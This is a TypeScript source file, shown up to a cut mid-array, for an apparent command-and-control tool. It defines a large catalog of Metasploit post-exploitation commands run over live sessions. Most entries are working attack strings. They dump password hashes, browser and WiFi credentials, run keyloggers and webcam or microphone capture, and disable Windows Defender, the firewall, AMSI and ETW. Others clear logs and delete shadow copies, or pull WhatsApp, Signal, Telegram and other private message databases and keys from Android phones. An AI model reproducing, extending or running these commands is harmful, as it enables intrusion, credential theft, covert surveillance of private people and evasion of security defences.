/**
 * Post-Exploitation Command Definitions & Execution Engine
 * All commands execute via live MSF RPC session.meterpreter_write/read.
 */
import { getRpcToken, rpcCall } from "../msf-rpc";

// ── Types ────────────────────────────────────────────────────

export type C2Command = {
  id: string;
  name: string;
  category: string;
  description: string;
  needsParam?: boolean;
  paramLabel?: string;
  paramPlaceholder?: string;
  dangerous?: boolean;
};

export type C2Result = {
  success: boolean;
  output: string;
  data?: unknown;
  error?: string;
};

export type AgentSession = {
  id: number;
  type: string;
  tunnel: string;
  via: string;
  info: string;
  workspace: string;
  lastSeen: string;
  platform?: string;
  arch?: string;
  username?: string;
  remoteHost?: string;
};

// ── 80+ Commands catalog ─────────────────────────────────────

const COMMAND_CATALOG: C2Command[] = [
  // ── System ──────────────────────────────────────────────────
  { id: "sysinfo",       name: "sysinfo",        category: "System",     description: "Get system info (OS, arch, domain)" },
  { id: "getuid",        name: "getuid",          category: "System",     description: "Get current user ID / SID" },
  { id: "getpid",        name: "getpid",          category: "System",     description: "Get current process ID" },
  { id: "machine_id",    name: "machine_id",      category: "System",     description: "Get machine GUID" },
  { id: "uuid",          name: "uuid",            category: "System",     description: "Get session UUID" },
  { id: "reboot",        name: "reboot",          category: "System",     description: "Reboot the target machine", dangerous: true },
  { id: "shutdown",      name: "shutdown",        category: "System",     description: "Shutdown the target machine", dangerous: true },
  { id: "sleep",         name: "sleep",           category: "System",     description: "Sleep the meterpreter payload", needsParam: true, paramLabel: "Seconds", paramPlaceholder: "30" },
  { id: "hibernate",     name: "hibernate",       category: "System",     description: "Hibernate the target machine", dangerous: true },
  { id: "lock_screen",   name: "lock_screen",     category: "System",     description: "Lock the target workstation" },
  { id: "get_time",      name: "get_time",        category: "System",     description: "Get system time on target" },
  { id: "uptime",        name: "idletime",        category: "System",     description: "Get system idle time / uptime" },
  { id: "get_env",       name: "get_env",         category: "System",     description: "Get environment variable", needsParam: true, paramLabel: "Variable", paramPlaceholder: "PATH" },
  { id: "getproxy",      name: "getproxy",        category: "System",     description: "Get proxy configuration" },

  // ── Filesystem ──────────────────────────────────────────────
  { id: "pwd",           name: "pwd",             category: "Filesystem", description: "Print working directory" },
  { id: "ls",            name: "ls",              category: "Filesystem", description: "List directory", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\" },
  { id: "cd",            name: "cd",              category: "Filesystem", description: "Change directory", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\Users" },
  { id: "download",      name: "download",        category: "Filesystem", description: "Download file from target", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\file.txt" },
  { id: "upload",        name: "upload",          category: "Filesystem", description: "Upload file to target", needsParam: true, paramLabel: "src dst", paramPlaceholder: "/tmp/f C:\\f.txt" },
  { id: "cat",           name: "cat",             category: "Filesystem", description: "Read file contents", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\file.txt" },
  { id: "rm",            name: "rm",              category: "Filesystem", description: "Delete file", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\file.txt", dangerous: true },
  { id: "mkdir",         name: "mkdir",           category: "Filesystem", description: "Create directory", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\temp" },
  { id: "rmdir",         name: "rmdir",           category: "Filesystem", description: "Remove directory", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\temp", dangerous: true },
  { id: "search",        name: "search",          category: "Filesystem", description: "Search for files", needsParam: true, paramLabel: "Pattern", paramPlaceholder: "*.docx" },
  { id: "move",          name: "mv",              category: "Filesystem", description: "Move/rename file", needsParam: true, paramLabel: "src dst", paramPlaceholder: "C:\\a.txt D:\\b.txt" },
  { id: "copy",          name: "cp",              category: "Filesystem", description: "Copy file", needsParam: true, paramLabel: "src dst", paramPlaceholder: "C:\\a.txt D:\\a.txt" },
  { id: "checksum",      name: "checksum",        category: "Filesystem", description: "Compute file checksum", needsParam: true, paramLabel: "File + algo", paramPlaceholder: "C:\\f.exe md5" },
  { id: "edit",          name: "edit",            category: "Filesystem", description: "Edit a file in vi", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\file.txt" },
  { id: "show_mount",    name: "show_mount",      category: "Filesystem", description: "Show mounted drives" },
  { id: "drive_list",    name: "run post/multi/manage/list_disk_partitions", category: "Filesystem", description: "List disk partitions" },

  // ── Process ─────────────────────────────────────────────────
  { id: "ps",            name: "ps",              category: "Process",    description: "List running processes" },
  { id: "kill",          name: "kill",            category: "Process",    description: "Kill a process by PID", needsParam: true, paramLabel: "PID", paramPlaceholder: "1234", dangerous: true },
  { id: "execute",       name: "execute -f cmd.exe -a '/c whoami'", category: "Process", description: "Execute a system command", needsParam: true, paramLabel: "Command", paramPlaceholder: "whoami" },
  { id: "migrate",       name: "migrate",         category: "Process",    description: "Migrate to another process", needsParam: true, paramLabel: "PID", paramPlaceholder: "1234" },
  { id: "pgrep",         name: "pgrep",           category: "Process",    description: "Find PID by name", needsParam: true, paramLabel: "Name", paramPlaceholder: "explorer" },
  { id: "pkill",         name: "pkill",           category: "Process",    description: "Kill process by name", needsParam: true, paramLabel: "Name", paramPlaceholder: "notepad", dangerous: true },

  // ── Network ─────────────────────────────────────────────────
  { id: "ifconfig",      name: "ifconfig",        category: "Network",    description: "Show network interfaces" },
  { id: "ipconfig",      name: "ipconfig",        category: "Network",    description: "Show IP config (Windows)" },
  { id: "route",         name: "route",           category: "Network",    description: "Show routing table" },
  { id: "netstat",       name: "netstat",         category: "Network",    description: "Show active connections" },
  { id: "arp",           name: "arp",             category: "Network",    description: "Show ARP cache" },
  { id: "portfwd",       name: "portfwd add -l 8080 -r 127.0.0.1 -p 80", category: "Network", description: "Add port forward", needsParam: true, paramLabel: "lport:rhost:rport", paramPlaceholder: "8080:127.0.0.1:80" },
  { id: "resolve",       name: "resolve",         category: "Network",    description: "Resolve hostname", needsParam: true, paramLabel: "Hostname", paramPlaceholder: "google.com" },
  { id: "arp_scan",      name: "run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24", category: "Network", description: "ARP scan local subnet", needsParam: true, paramLabel: "CIDR", paramPlaceholder: "192.168.1.0/24" },

  // ── Credentials ─────────────────────────────────────────────
  { id: "hashdump",      name: "hashdump",        category: "Credentials", description: "Dump Windows SAM password hashes", dangerous: true },
  { id: "loot",          name: "loot",            category: "Credentials", description: "List collected loot" },
  { id: "creds_all",     name: "creds_all",       category: "Credentials", description: "Collect all credentials" },
  { id: "mimikatz",      name: "load kiwi\nwhoami", category: "Credentials", description: "Load Mimikatz (kiwi extension)" },
  { id: "kiwi_creds",    name: "creds_all",       category: "Credentials", description: "Dump all creds via kiwi" },
  { id: "kiwi_wdigest",  name: "lsa_dump_sam",   category: "Credentials", description: "Dump NTLM hashes (kiwi)" },
  { id: "wifi_list",     name: "run post/multi/gather/wifi_credentials", category: "Credentials", description: "Dump saved WiFi passwords" },
  { id: "browser_creds", name: "run post/multi/gather/browser_credentials", category: "Credentials", description: "Dump browser saved passwords" },
  { id: "enum_logged_on",name: "run post/windows/gather/enum_logged_on_users", category: "Credentials", description: "Enum logged-on Windows users" },

  // ── Surveillance ─────────────────────────────────────────────
  { id: "webcam_list",   name: "webcam_list",     category: "Surveillance", description: "List available cameras" },
  { id: "webcam_snap",   name: "webcam_snap",     category: "Surveillance", description: "Take webcam photo", needsParam: true, paramLabel: "Camera #", paramPlaceholder: "1" },
  { id: "webcam_stream", name: "webcam_stream",   category: "Surveillance", description: "Start webcam stream", needsParam: true, paramLabel: "Camera #", paramPlaceholder: "1" },
  { id: "record_mic",    name: "record_mic",      category: "Surveillance", description: "Record microphone", needsParam: true, paramLabel: "Duration (s)", paramPlaceholder: "10" },
  { id: "screenshot",    name: "screenshot",      category: "Surveillance", description: "Take screenshot of desktop" },
  { id: "screengrab",    name: "screengrab",      category: "Surveillance", description: "Grab screen pixel data" },
  { id: "keyscan_start", name: "keyscan_start",   category: "Surveillance", description: "Start keylogger" },
  { id: "keyscan_dump",  name: "keyscan_dump",    category: "Surveillance", description: "Dump captured keystrokes" },
  { id: "keyscan_stop",  name: "keyscan_stop",    category: "Surveillance", description: "Stop keylogger" },
  { id: "clipboard_get", name: "clipboard_get",   category: "Surveillance", description: "Get clipboard contents" },
  { id: "clipboard_set", name: "clipboard_set",   category: "Surveillance", description: "Set clipboard text", needsParam: true, paramLabel: "Text", paramPlaceholder: "malicious text" },
  { id: "desktop",       name: "run vnc",         category: "Surveillance", description: "VNC desktop access" },

  // ── Persistence ──────────────────────────────────────────────
  { id: "persist_service",   name: "run post/windows/manage/persistence_exe STARTUP=SCHEDULER", category: "Persistence", description: "Install scheduled-task persistence" },
  { id: "persist_registry",  name: "run post/windows/manage/persistence STARTUP=REGISTRY",      category: "Persistence", description: "Add registry run-key persistence" },
  { id: "persist_startup",   name: "run post/windows/manage/persistence STARTUP=SCHEDULER",     category: "Persistence", description: "Install startup folder persistence" },
  { id: "cleanup",           name: "clearev",     category: "Persistence", description: "Clear Windows event logs", dangerous: true },
  { id: "timestomp",         name: "timestomp",   category: "Persistence", description: "Modify file timestamps", needsParam: true, paramLabel: "File", paramPlaceholder: "C:\\evil.exe" },
  { id: "enable_rdp",        name: "run post/windows/manage/enable_rdp", category: "Persistence", description: "Enable RDP remote desktop" },
  { id: "disable_defender",  name: "run post/windows/manage/killav",     category: "Persistence", description: "Disable Windows Defender", dangerous: true },

  // ── Privilege Escalation ──────────────────────────────────────
  { id: "getsystem",    name: "getsystem",        category: "PrivEsc",    description: "Escalate to SYSTEM/root" },
  { id: "getprivs",     name: "getprivs",         category: "PrivEsc",    description: "Enable all available privileges" },
  { id: "uac_bypass",   name: "run post/windows/escalate/bypassuac",     category: "PrivEsc",    description: "Attempt UAC bypass" },
  { id: "local_exploit",name: "run post/multi/recon/local_exploit_suggester", category: "PrivEsc", description: "Find local privilege escalation paths" },

  // ── Shell ────────────────────────────────────────────────────
  { id: "shell",            name: "shell",         category: "Shell",      description: "Drop into interactive system shell" },
  { id: "powershell_shell", name: "powershell_shell", category: "Shell",   description: "Open interactive PowerShell" },
  { id: "powershell_exec",  name: "powershell_execute", category: "Shell", description: "Execute PowerShell one-liner", needsParam: true, paramLabel: "Command", paramPlaceholder: "Get-Process" },
  { id: "run_cmd",          name: "run_cmd",       category: "Shell",      description: "Run raw shell command", needsParam: true, paramLabel: "Command", paramPlaceholder: "ipconfig /all" },
  { id: "irb",              name: "irb",           category: "Shell",      description: "Open interactive Ruby shell" },

  // ── Exfil ────────────────────────────────────────────────────
  { id: "download_all",     name: "download",      category: "Exfil",     description: "Download file", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\secret.txt" },
  { id: "upload_file",      name: "upload",        category: "Exfil",     description: "Upload file to target", needsParam: true, paramLabel: "src dst", paramPlaceholder: "/tmp/file.exe C:\\file.exe" },
  { id: "screenshot_exfil", name: "screenshot",    category: "Exfil",     description: "Take & save screenshot" },
  { id: "dump_tokens",      name: "use incognito\nlist_tokens -u", category: "Exfil", description: "Dump impersonation tokens" },
  { id: "exfil_docs",       name: "run post/windows/gather/collect_user_data_files", category: "Exfil", description: "Collect user documents/pictures" },
  { id: "exfil_browser",    name: "run post/multi/gather/browser_history", category: "Exfil", description: "Dump browser history" },

  // ── Root / Android ───────────────────────────────────────────
  { id: "android_upgrade",      name: "run post/multi/manage/shell_to_meterpreter", category: "Root/Android", description: "Upgrade shell → Meterpreter (Android)" },
  { id: "android_dump_sms",     name: "dump_sms",                                    category: "Root/Android", description: "Dump all SMS messages" },
  { id: "android_dump_contacts",name: "dump_contacts",                               category: "Root/Android", description: "Dump full contact list" },
  { id: "android_dump_calllog", name: "dump_calllog",                                category: "Root/Android", description: "Dump call history" },
  { id: "android_geo",          name: "geolocate",                                   category: "Root/Android", description: "Get GPS coordinates (Android)" },
  { id: "android_wipe",         name: "wipe",                                        category: "Root/Android", description: "Factory wipe device (root required)", dangerous: true },
  { id: "android_silent",       name: "set_audio_mode -m 0",                        category: "Root/Android", description: "Set audio to silent mode" },
  { id: "android_hide_icon",    name: "hide_app_icon",                               category: "Root/Android", description: "Hide payload icon from launcher" },
  { id: "android_send_sms",     name: "send_sms",                                    category: "Root/Android", description: "Send SMS from target device", needsParam: true, paramLabel: "number:message", paramPlaceholder: "+1555:hello" },
  { id: "whatsapp_db",          name: "run post/android/capture/app_data -p com.whatsapp",           category: "Root/Android", description: "Pull WhatsApp database (root)" },
  { id: "telegram_db",          name: "run post/android/capture/app_data -p org.telegram.messenger", category: "Root/Android", description: "Pull Telegram database (root)" },
  { id: "instagram_cookies",    name: "run post/android/capture/app_data -p com.instagram.android",  category: "Root/Android", description: "Pull Instagram session cookies" },
  { id: "facebook_cookies",     name: "run post/android/capture/app_data -p com.facebook.katana",    category: "Root/Android", description: "Pull Facebook session data" },

  // ── AV / EDR Evasion ─────────────────────────────────────────
  // Detection
  { id: "ev_av_detect",        name: "execute -H -f cmd.exe -a '/c sc query type= all | findstr /i \"antivirus avg avast eset norton mcafee bitdefender kaspersky malwarebytes crowdstrike sentinelone cylance carbon sophos trend\"'", category: "Evasion", description: "Detect running AV/EDR services" },
  { id: "ev_av_procs",         name: "execute -H -f cmd.exe -a '/c tasklist | findstr /i \"MsMpEng avastui avgui egui bdservicehost cyoptics sentinelAgent CylanceSvc CarbonBlack CsAgent MSSense bdredline WRSA SophosUI ntrtscan uiseagnt'\"", category: "Evasion", description: "List known AV/EDR processes" },
  { id: "ev_wmi_av",           name: "execute -H -f powershell.exe -a \"-c Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select displayName,productState | ConvertTo-Json\"", category: "Evasion", description: "WMI SecurityCenter2 AV product list" },
  { id: "ev_edr_reg",          name: "execute -H -f cmd.exe -a '/c reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>nul & reg query HKLM\\SYSTEM\\CurrentControlSet\\Services 2>nul | findstr /i \"crowdstrike sentinel carbon cylance sophos\"'", category: "Evasion", description: "Check registry for EDR startup keys" },
  { id: "ev_fw_status",        name: "execute -H -f cmd.exe -a '/c netsh advfirewall show allprofiles state'", category: "Evasion", description: "Check Windows firewall status" },

  // Windows Defender
  { id: "ev_def_status",       name: "execute -H -f powershell.exe -a \"-c Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled | ConvertTo-Json\"", category: "Evasion", description: "Get Defender real-time protection status" },
  { id: "ev_def_disable_ps",   name: "execute -H -f powershell.exe -a \"-c Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableAntiSpyware $true\"", category: "Evasion", description: "Disable Defender via PowerShell cmdlet", dangerous: true },
  { id: "ev_def_disable_reg",  name: "execute -H -f cmd.exe -a '/c reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f'", category: "Evasion", description: "Disable Defender via Group Policy registry", dangerous: true },
  { id: "ev_def_exclusion",    name: "execute -H -f powershell.exe -a \"-c Add-MpPreference -ExclusionPath C:\\ -ExclusionExtension '.exe','.ps1','.dll'\"", category: "Evasion", description: "Add full C:\\ exclusion to Defender", dangerous: true },
  { id: "ev_def_service",      name: "execute -H -f cmd.exe -a '/c sc config WinDefend start= disabled & net stop WinDefend & sc config SecurityHealthService start= disabled'", category: "Evasion", description: "Stop & disable Defender service", dangerous: true },
  { id: "ev_def_tamper_off",   name: "execute -H -f powershell.exe -a \"-c Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features -Name TamperProtection -Value 0\"", category: "Evasion", description: "Disable Defender tamper protection (requires SYSTEM)", dangerous: true },
  { id: "ev_smartscreen_off",  name: "execute -H -f reg.exe -a 'add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System /v EnableSmartScreen /t REG_DWORD /d 0 /f'", category: "Evasion", description: "Disable SmartScreen filter", dangerous: true },

  // Firewall
  { id: "ev_fw_disable",       name: "execute -H -f cmd.exe -a '/c netsh advfirewall set allprofiles state off'", category: "Evasion", description: "Disable Windows Firewall (all profiles)", dangerous: true },
  { id: "ev_fw_rule_add",      name: "execute -H -f cmd.exe -a '/c netsh advfirewall firewall add rule name=\"svchost\" dir=in action=allow protocol=TCP localport=4444'", category: "Evasion", description: "Add firewall rule to allow C2 port 4444" },

  // AMSI & ETW bypass
  { id: "ev_amsi_bypass",      name: "execute -H -f powershell.exe -a \"-enc JABhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAPQAkAHQAcgB1AGUA\"", category: "Evasion", description: "Patch AMSI via reflection (AmsiInitFailed=true)", dangerous: true },
  { id: "ev_amsi_dll_patch",   name: "execute -H -f powershell.exe -a \"-c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"", category: "Evasion", description: "Disable AMSI scan interface via .NET reflection", dangerous: true },
  { id: "ev_etw_patch",        name: "execute -H -f powershell.exe -a \"-c $a=[Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider');$b=$a.GetField('m_enabled','NonPublic,Instance');[System.Runtime.InteropServices.Marshal]::WriteInt32([System.Runtime.InteropServices.Marshal]::ReadIntPtr($b.GetValue([System.Diagnostics.Eventing.EventProvider]::new([System.Guid]::NewGuid()))),0)\"", category: "Evasion", description: "Patch ETW (Event Tracing for Windows) to NOP", dangerous: true },
  { id: "ev_scriptblock_log",  name: "execute -H -f powershell.exe -a \"-c Set-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0\"", category: "Evasion", description: "Disable PowerShell script block logging" },
  { id: "ev_clm_bypass",       name: "execute -H -f powershell.exe -a \"-c $env:__PSLockdownPolicy=0; [System.Management.Automation.LanguageMode]\"", category: "Evasion", description: "Bypass Constrained Language Mode" },

  // Process injection / migration
  { id: "ev_migrate_explorer", name: "run post/windows/manage/migrate PPID_SPOOF=true NAME=explorer.exe", category: "Evasion", description: "Migrate Meterpreter into explorer.exe", dangerous: true },
  { id: "ev_migrate_svchost",  name: "run post/windows/manage/migrate NAME=svchost.exe",                  category: "Evasion", description: "Migrate into svchost.exe (SYSTEM)", dangerous: true },
  { id: "ev_migrate_lsass",    name: "run post/windows/manage/migrate NAME=lsass.exe",                    category: "Evasion", description: "Migrate into lsass.exe (memory dump protection)", dangerous: true },
  { id: "ev_inject_shellcode", name: "run post/windows/manage/shellcode_inject",                          category: "Evasion", description: "Inject shellcode into remote process" },
  { id: "ev_hollow_process",   name: "run post/windows/manage/process_hollowing",                         category: "Evasion", description: "Process hollowing (spawn + replace image)" },
  { id: "ev_reflective_dll",   name: "load reflective_dll",                                               category: "Evasion", description: "Load reflective DLL (in-memory, no disk)" },
  { id: "ev_ppid_spoof",       name: "run post/windows/manage/ppid_spoof",                                category: "Evasion", description: "Spoof parent PID to evade behavioral detection" },

  // UAC bypass techniques
  { id: "ev_uac_fodhelper",    name: "run exploit/windows/local/bypassuac_fodhelper",                     category: "Evasion", description: "UAC bypass via fodhelper.exe (Win10+)" },
  { id: "ev_uac_eventvwr",     name: "run exploit/windows/local/bypassuac_eventvwr",                      category: "Evasion", description: "UAC bypass via eventvwr.exe (Win7-10)" },
  { id: "ev_uac_comhijack",    name: "run exploit/windows/local/bypassuac_comhijack",                     category: "Evasion", description: "UAC bypass via COM object hijacking" },
  { id: "ev_uac_sdclt",        name: "run exploit/windows/local/bypassuac_sdclt",                         category: "Evasion", description: "UAC bypass via sdclt.exe" },
  { id: "ev_uac_wscript",      name: "run exploit/windows/local/bypassuac_injection_winsxs",              category: "Evasion", description: "UAC bypass via WinSxS DLL injection" },

  // Token & privilege
  { id: "ev_token_steal",      name: "use incognito\nsteal_token 4",                                      category: "Evasion", description: "Steal SYSTEM token from PID (default 4=SYSTEM)", needsParam: true, paramLabel: "PID", paramPlaceholder: "4" },
  { id: "ev_impersonate",      name: "use incognito\nimpersonate_token \"NT AUTHORITY\\\\SYSTEM\"",        category: "Evasion", description: "Impersonate NT AUTHORITY\\SYSTEM token" },
  { id: "ev_lsa_protect_off",  name: "run post/windows/manage/lsa_protection_off",                        category: "Evasion", description: "Disable LSA Protection (PPL) for credential dumping" },

  // Log & forensic clearing
  { id: "ev_clear_all_logs",   name: "clearev",                                                            category: "Evasion", description: "Clear Security, System, Application event logs", dangerous: true },
  { id: "ev_clear_ps_hist",    name: "execute -H -f powershell.exe -a \"-c Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -EA 0; Clear-History\"", category: "Evasion", description: "Wipe PowerShell command history" },
  { id: "ev_clear_mru",        name: "execute -H -f cmd.exe -a '/c reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs /f & reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f'", category: "Evasion", description: "Clear Windows Recent Documents & Run MRU" },
  { id: "ev_clear_prefetch",   name: "execute -H -f cmd.exe -a '/c del /q /f C:\\Windows\\Prefetch\\*.pf 2>nul'", category: "Evasion", description: "Delete Windows Prefetch files (execution traces)" },
  { id: "ev_clear_recycle",    name: "execute -H -f cmd.exe -a '/c rd /s /q C:\\$Recycle.Bin 2>nul'",     category: "Evasion", description: "Empty Recycle Bin" },
  { id: "ev_timestomp_sys",    name: "timestomp C:\\Windows\\System32\\svchost.exe -m \"-30d\"",          category: "Evasion", description: "Timestomp svchost.exe to confuse forensics" },
  { id: "ev_disable_vss",      name: "execute -H -f cmd.exe -a '/c vssadmin delete shadows /all /quiet & bcdedit /set {default} recoveryenabled No & bcdedit /set {default} bootstatuspolicy ignoreallfailures'", category: "Evasion", description: "Delete VSS shadow copies & disable recovery", dangerous: true },

  // Android security
  { id: "ev_play_protect_off", name: "execute -f /system/bin/sh -a '-c \"pm disable com.google.android.gms.phenotype 2>/dev/null; settings put global package_verifier_enable 0; settings put secure install_non_market_apps 1\"'", category: "Evasion", description: "Disable Google Play Protect & sideload restriction" },
  { id: "ev_knox_disable",     name: "execute -f /system/bin/sh -a '-c \"pm disable com.samsung.android.knox.containeragent 2>/dev/null; settings put secure knox_container_ready 0\"'", category: "Evasion", description: "Disable Samsung Knox container (root required)" },
  { id: "ev_android_hide",     name: "hide_app_icon",                                                     category: "Evasion", description: "Hide payload app icon from launcher" },
  { id: "ev_android_perms",    name: "execute -f /system/bin/sh -a '-c \"pm grant $(pm list packages | grep -i utility | cut -d: -f2) android.permission.READ_CONTACTS android.permission.RECORD_AUDIO android.permission.CAMERA android.permission.ACCESS_FINE_LOCATION android.permission.READ_SMS 2>/dev/null\"'", category: "Evasion", description: "Auto-grant all dangerous permissions silently" },

  // Browser / Windows ─────────────────────────────────────────
  { id: "chrome_cookies",       name: "run post/multi/gather/chrome_cookies",                       category: "Browser", description: "Steal Chrome cookies" },
  { id: "chrome_passwords",     name: "run post/multi/gather/chrome_passwords",                     category: "Browser", description: "Steal Chrome saved passwords" },
  { id: "chrome_history",       name: "run post/multi/gather/chrome_local_data",                    category: "Browser", description: "Dump Chrome browsing history" },
  { id: "firefox_creds",        name: "run post/multi/gather/firefox_creds",                        category: "Browser", description: "Dump Firefox saved credentials" },
  { id: "ie_creds",             name: "run post/windows/gather/credentials/ie",                     category: "Browser", description: "Dump IE/Edge credentials" },
  { id: "edge_creds",           name: "run post/windows/gather/credentials/windows_autologin",      category: "Browser", description: "Windows auto-login credentials" },

  // ── Windows Specific ─────────────────────────────────────────
  { id: "root_getsystem",   name: "getsystem",                                              category: "Windows", description: "SYSTEM privilege escalation" },
  { id: "root_shadow",      name: "cat /etc/shadow",                                        category: "Windows", description: "Dump /etc/shadow (Linux)" },
  { id: "root_sudoers",     name: "cat /etc/sudoers",                                       category: "Windows", description: "Read /etc/sudoers (Linux)" },
  { id: "win_browser_creds",name: "run post/windows/gather/credentials/credential_collector",category: "Windows", description: "Collect all Windows browser credentials" },
  { id: "win_tokens",       name: "use incognito\nlist_tokens -u",                          category: "Windows", description: "List Windows impersonation tokens" },
  { id: "win_clipboard",    name: "run post/windows/gather/clipboard",                      category: "Windows", description: "Full clipboard history grab" },
  { id: "win_enum_apps",    name: "run post/windows/gather/enum_applications",              category: "Windows", description: "Enumerate installed applications" },
  { id: "win_enum_shares",  name: "run post/windows/gather/enum_shares",                   category: "Windows", description: "Enumerate network shares" },
  { id: "win_enum_domain",  name: "run post/windows/gather/enum_domain",                   category: "Windows", description: "Enumerate Active Directory domain" },
  { id: "win_reg_dump",     name: "run post/windows/gather/registry_persistence",          category: "Windows", description: "Dump registry hives" },
  { id: "linux_wifi",       name: "run post/linux/gather/wifi_credentials",                category: "Windows", description: "Dump WiFi credentials (Linux)" },

  // ── Communications / Phone Calls ───────────────────────────
  { id: "call_log",              name: "dump_calllog",                                                        category: "Comms",     description: "Dump full call log history" },
  { id: "call_log_recent",       name: "run post/android/gather/sub_info",                                   category: "Comms",     description: "Get subscriber info + phone number" },
  { id: "call_record_live",      name: "record_mic -d 300",                                                   category: "Comms",     description: "Record 5 min of live audio (calls/ambient)", needsParam: true, paramLabel: "Duration (s)", paramPlaceholder: "300" },
  { id: "sms_dump",              name: "dump_sms",                                                            category: "Comms",     description: "Dump all SMS / MMS messages" },
  { id: "sms_send",              name: "send_sms",                                                            category: "Comms",     description: "Send SMS from target device", needsParam: true, paramLabel: "number:message", paramPlaceholder: "+15551234:test" },
  { id: "contacts_dump",         name: "dump_contacts",                                                       category: "Comms",     description: "Dump full contact book" },
  { id: "voip_capture",          name: "record_mic -d 600",                                                   category: "Comms",     description: "Capture 10 min VoIP / call audio" },
  { id: "sim_info",              name: "run post/android/gather/sub_info",                                    category: "Comms",     description: "Get IMSI, carrier, phone number" },
  { id: "imei_imsi",             name: "run post/android/gather/device_info",                                 category: "Comms",     description: "Get IMEI / IMSI / serial number" },
  { id: "mobile_accounts",       name: "run post/android/gather/accounts",                                    category: "Comms",     description: "List all Google / device accounts" },

  // ── Social Media — WhatsApp ───────────────────────────────
  { id: "whatsapp_msgs",         name: "download /data/data/com.whatsapp/databases/msgstore.db",             category: "Social",    description: "Download WhatsApp message DB (root)" },
  { id: "whatsapp_contacts",     name: "download /data/data/com.whatsapp/databases/wa.db",                   category: "Social",    description: "Download WhatsApp contact DB" },
  { id: "whatsapp_key",          name: "download /data/data/com.whatsapp/files/key",                         category: "Social",    description: "Download WhatsApp encryption key (root)" },
  { id: "whatsapp_media",        name: "download -r /sdcard/WhatsApp/Media",                                 category: "Social",    description: "Download all WhatsApp media files" },
  { id: "whatsapp_appdata",      name: "run post/android/capture/app_data -p com.whatsapp",                 category: "Social",    description: "Full WhatsApp app data extraction" },
  { id: "whatsapp_biz",          name: "run post/android/capture/app_data -p com.whatsapp.w4b",             category: "Social",    description: "WhatsApp Business app data" },

  // ── Social Media — Telegram ───────────────────────────────
  { id: "telegram_msgs",         name: "download /data/data/org.telegram.messenger/files/cache4.db",        category: "Social",    description: "Download Telegram message cache DB" },
  { id: "telegram_appdata",      name: "run post/android/capture/app_data -p org.telegram.messenger",       category: "Social",    description: "Full Telegram app data extraction" },

  // ── Social Media — Signal ─────────────────────────────────
  { id: "signal_db",             name: "download /data/data/org.thoughtcrime.securesms/databases/signal.db",category: "Social",    description: "Download Signal DB (root required)" },
  { id: "signal_appdata",        name: "run post/android/capture/app_data -p org.thoughtcrime.securesms",   category: "Social",    description: "Signal full app data (root)" },

  // ── Social Media — Facebook / Instagram ───────────────────
  { id: "fb_messenger",          name: "download /data/data/com.facebook.orca/databases/threads_db2",       category: "Social",    description: "Download Facebook Messenger DB" },
  { id: "fb_appdata",            name: "run post/android/capture/app_data -p com.facebook.orca",            category: "Social",    description: "Facebook Messenger full data" },
  { id: "instagram_db",          name: "download /data/data/com.instagram.android/databases/direct.db",     category: "Social",    description: "Download Instagram DM database" },
  { id: "instagram_appdata",     name: "run post/android/capture/app_data -p com.instagram.android",        category: "Social",    description: "Instagram full app data" },

  // ── Social Media — Snapchat / TikTok / Twitter ───────────
  { id: "snapchat_db",           name: "download /data/data/com.snapchat.android/databases/main.db",        category: "Social",    description: "Download Snapchat database" },
  { id: "snapchat_appdata",      name: "run post/android/capture/app_data -p com.snapchat.android",         category: "Social",    description: "Snapchat full app data" },
  { id: "tiktok_db",             name: "download /data/data/com.zhiliaoapp.musically/databases/IM.db",      category: "Social",    description: "Download TikTok IM database" },
  { id: "twitter_db",            name: "download /data/data/com.twitter.android/databases/app.db",          category: "Social",    description: "Download Twitter/X database" },
  { id: "twitter_appdata",       name: "run post/android/capture/app_data -p com.twitter.android",          category: "Social",    description: "Twitter/X full app data" },

  // ── Social Media — Discord / Viber / WeChat / Line ───────
  { id: "discord_db",            name: "download /data/data/com.discord/databases/",                        category: "Social",    description: "Download Discord local databases" },
  { id: "viber_db",              name: "download /data/data/com.viber.voip/databases/",                     category: "Social",    description: "Download Viber databases" },
  { id: "wechat_db",             name: "download /data/data/com.tencent.mm/MicroMsg/",                      category: "Social",    description: "Download WeChat databases (root)" },
  { id: "line_db",               name: "download /data/data/jp.naver.line.android/databases/naver_line",    category: "Social",    description: "Download Line message database" },
  { id: "skype_db",              name: "download /data/data/com.skype.raider/databases/",                   category: "Social",    description: "Download Skype databases" },
  { id: "linkedin_db",           name: "download /data/data/com.linkedin.android/databases/",              category: "Social",    description: "Download LinkedIn databases" },

  // ── Email / Google ─────────────────────────────────────────
  { id: "gmail_db",              name: "download /data/data/com.google.android.gm/databases/",              category: "Social",    description: "Download Gmail databases" },
